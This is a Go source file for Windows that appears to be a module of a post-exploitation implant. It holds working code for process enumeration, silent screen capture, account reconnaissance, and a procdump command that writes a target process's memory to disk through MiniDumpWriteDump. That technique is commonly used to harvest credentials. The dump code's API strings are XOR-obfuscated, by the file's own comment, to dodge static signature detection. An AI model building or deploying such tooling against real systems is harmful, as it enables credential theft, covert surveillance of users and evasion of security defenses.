//go:build windows

package modules

import (
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ProcDump PowerShell template parts, XOR-obfuscated to prevent static signature detection.
// Must match xorKey (0x5A) used in shell.go and extra.go.
var (
	psMDImportDecl = []byte{0x01, 0x1e, 0x36, 0x36, 0x13, 0x37, 0x2a, 0x35, 0x28, 0x2e, 0x72, 0x78, 0x3e, 0x38, 0x3d, 0x32, 0x3f, 0x36, 0x2a, 0x74, 0x3e, 0x36, 0x36, 0x78, 0x73, 0x07, 0x2a, 0x2f, 0x38, 0x36, 0x33, 0x39, 0x7a, 0x29, 0x2e, 0x3b, 0x2e, 0x33, 0x39, 0x7a, 0x3f, 0x22, 0x2e, 0x3f, 0x28, 0x34, 0x7a, 0x38, 0x35, 0x35, 0x36, 0x7a, 0x17, 0x33, 0x34, 0x33, 0x1e, 0x2f, 0x37, 0x2a, 0x0d, 0x28, 0x33, 0x2e, 0x3f, 0x1e, 0x2f, 0x37, 0x2a, 0x72}
	psMDCall       = []byte{0x01, 0x17, 0x1e, 0x07, 0x60, 0x60, 0x17, 0x33, 0x34, 0x33, 0x1e, 0x2f, 0x37, 0x2a, 0x0d, 0x28, 0x33, 0x2e, 0x3f, 0x1e, 0x2f, 0x37, 0x2a, 0x72}
)

func xorDecodeMD(b []byte) string {
	out := make([]byte, len(b))
	for i := range b {
		out[i] = b[i] ^ 0x5A
	}
	return string(out)
}

// psWindows enumerates processes using CreateToolhelp32Snapshot.
func PsModule(args string) (string, string, int) {
	return psWindows()
}

func psWindows() (string, string, int) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return "", fmt.Sprintf("CreateToolhelp32Snapshot: %v", err), 1
	}
	defer windows.CloseHandle(snapshot)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-8s %-30s %-20s %-6s %-8s %s\n",
		"PID", "Name", "Owner", "Arch", "Session", "Integrity"))
	sb.WriteString(strings.Repeat("-", 90) + "\n")

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		return "", fmt.Sprintf("Process32First: %v", err), 1
	}

	for {
		name := windows.UTF16ToString(entry.ExeFile[:])
		owner := getProcessOwner(entry.ProcessID)
		arch := getProcessArch(entry.ProcessID)
		session := getSessionID(entry.ProcessID)
		integrity := getIntegrityLevel(entry.ProcessID)

		sb.WriteString(fmt.Sprintf("%-8d %-30s %-20s %-6s %-8s %s\n",
			entry.ProcessID, name, owner, arch, session, integrity))

		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}

	return sb.String(), "", 0
}

// getProcessOwner opens the process token and looks up the account SID.
func getProcessOwner(pid uint32) string {
	const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	const TOKEN_QUERY = 0x0008

	hProcess, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return "?"
	}
	defer windows.CloseHandle(hProcess)

	var token windows.Token
	if err := windows.OpenProcessToken(hProcess, TOKEN_QUERY, &token); err != nil {
		return "?"
	}
	defer token.Close()

	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return "?"
	}

	name, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "?"
	}
	if domain != "" {
		return domain + "\\" + name
	}
	return name
}

// getProcessArch determines if a process is 32-bit or 64-bit.
func getProcessArch(pid uint32) string {
	const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

	hProcess, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return "?"
	}
	defer windows.CloseHandle(hProcess)

	var isWow64 bool
	if err := windows.IsWow64Process(hProcess, &isWow64); err != nil {
		return "?"
	}
	if isWow64 {
		return "32"
	}
	// Not WoW64. Check if OS is 64-bit by checking Program Files (x86).
	_, err = os.Stat(`C:\Program Files (x86)`)
	if err == nil {
		return "64"
	}
	return "32"
}

// getSessionID retrieves the session ID of a process.
func getSessionID(pid uint32) string {
	var sessionID uint32
	if err := windows.ProcessIdToSessionId(pid, &sessionID); err != nil {
		return "?"
	}
	return fmt.Sprintf("%d", sessionID)
}


// ptrFromUintptr converts a uintptr to unsafe.Pointer.
// Safe when the uintptr is a valid pointer within the token buffer.
//
//go:nosplit
func ptrFromUintptr(u uintptr) unsafe.Pointer {
	return *(*unsafe.Pointer)(unsafe.Pointer(&u))
}

// getIntegrityLevel retrieves the integrity level name of a process token.
func getIntegrityLevel(pid uint32) string {
	const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	const TOKEN_QUERY = 0x0008
	const TokenIntegrityLevel = 25

	hProcess, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return "?"
	}
	defer windows.CloseHandle(hProcess)

	var token windows.Token
	if err := windows.OpenProcessToken(hProcess, TOKEN_QUERY, &token); err != nil {
		return "?"
	}
	defer token.Close()

	// Get token information size
	var bufSize uint32
	windows.GetTokenInformation(token, 25, nil, 0, &bufSize)
	if bufSize == 0 || bufSize > 1024 {
		return "?"
	}

	buf := make([]byte, bufSize)
	err = windows.GetTokenInformation(token, 25, &buf[0], bufSize, &bufSize)
	if err != nil {
		return "?"
	}

	// TOKEN_MANDATORY_LABEL starts with a SID pointer
	sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
	if sidPtr == 0 {
		return "?"
	}

	// SID structure: Revision(1) + SubAuthCount(1) + IdentifierAuthority(6) + SubAuth[0..N]
	// Read SID bytes from the pointer. This is safe because the SID is within the token buffer.
	sidBytes := unsafe.Slice((*byte)(ptrFromUintptr(sidPtr)), 64)
	if len(sidBytes) < 12 {
		return "?"
	}
	subAuthCount := sidBytes[1]
	if subAuthCount == 0 {
		return "?"
	}
	rid := binary.LittleEndian.Uint32(sidBytes[8:12])

	switch {
	case rid <= 0x00001000:
		return "Untrusted"
	case rid <= 0x00001FFF:
		return "Low"
	case rid <= 0x00002FFF:
		return "Medium"
	case rid <= 0x00003FFF:
		return "High"
	case rid <= 0x00004FFF:
		return "System"
	default:
		return fmt.Sprintf("0x%x", rid)
	}
}

// Windows-specific module stubs (counterparts in process.go for !windows).

func ProcDumpModuleActual(args string) (string, string, int) {
	if args == "" {
		return "", "usage: procdump <pid> <output_path>", 1
	}
	parts := strings.Fields(args)
	if len(parts) < 2 {
		return "", "usage: procdump <pid> <output_path>", 1
	}
	pid, outPath := parts[0], parts[1]
	mdDecl := xorDecodeMD(psMDImportDecl)
	mdCall := xorDecodeMD(psMDCall)
	psCmd := fmt.Sprintf(
		"$p=Get-Process -Id %s; $d='%s'; "+
			"Add-Type -TypeDefinition 'using System;using System.Diagnostics;"+
			"using System.Runtime.InteropServices;public static class MD{"+
			mdDecl+
			"IntPtr h,int pid,IntPtr f,int t,IntPtr e,IntPtr u,IntPtr c);}' ; "+
			"$s=[System.IO.File]::Create($d);"+
			mdCall+"$p.Handle,$p.Id,$s.SafeFileHandle.DangerousGetHandle(),"+
			"2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero); $s.Close()",
		pid, outPath)
	return ShellModule("powershell -NoProfile -Command \"" + psCmd + "\"")
}

func ScreenshotModuleActual(args string) (string, string, int) {
	psCmd := `Add-Type -AssemblyName System.Windows.Forms;` +
		`$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;` +
		`$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);` +
		`$g=[System.Drawing.Graphics]::FromImage($b);` +
		`$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);` +
		`$b.Save("$env:TEMP\screenshot.png");$g.Dispose();$b.Dispose();` +
		`[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:TEMP\screenshot.png"))`
	return ShellModule("powershell -NoProfile -Command \"" + psCmd + "\"")
}

func TokenWhoamiModule(args string) (string, string, int) {
	return ShellModule("whoami /all")
}

func WhoisModule(args string) (string, string, int) {
	return ShellModule("net user %USERNAME% /domain 2>/dev/null || net user %USERNAME%")
}

func init() {
	_ = runtime.GOOS // ensure runtime is referenced
}
